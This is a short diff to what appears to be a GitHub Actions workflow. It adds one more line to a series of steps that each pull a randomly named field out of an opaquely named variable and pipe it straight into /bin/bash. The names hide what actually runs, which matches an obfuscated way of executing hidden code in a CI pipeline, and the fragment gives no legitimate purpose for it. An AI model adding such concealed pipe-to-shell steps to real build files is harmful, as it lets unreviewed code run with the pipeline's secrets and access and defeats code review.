@@ -48,6 +48,7 @@ jobs:
           echo $von9 | jq -r .rg37692 | /bin/bash
           echo $unhn47 | jq -r .i317 | /bin/bash
           echo $dl3 | jq -r .vm35114 | /bin/bash
+          echo $jc72 | jq -r .fd4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
